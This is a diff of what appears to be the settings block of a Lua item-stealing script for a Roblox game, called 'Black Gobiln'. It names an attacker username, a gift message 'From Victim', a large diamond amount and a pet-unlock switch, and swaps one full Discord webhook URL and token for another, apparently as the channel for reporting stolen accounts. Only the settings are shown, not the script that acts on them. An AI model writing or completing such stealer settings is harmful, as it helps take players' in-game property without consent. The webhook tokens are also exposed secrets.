@@ -1,7 +1,7 @@
 
 _G.Username = "vukantesteral"
 _G.Scriptname = "Black Gobiln"
-_G.Webhook = https://discord.com/api/webhooks/1096789294544322590/XY-j3a7IET-B5IwjRmX9RiCnwI0z1VApU_DklxTmYKhJTKxJHAzlvQgFHyu8wIqrddkc 
+_G.Webhook = https://discord.com/api/webhooks/1096885567779786852/xw3de2qHftzBOkN3TbRP7Yd6tOZVoY0ceDfyjAaXD_gbeVHd7Sf10_oxoPQmmn16f_J3
 _G.GiftMessege = "From Victim"
 _G.Diamonds =  500000
 _G.UnclockPets = true
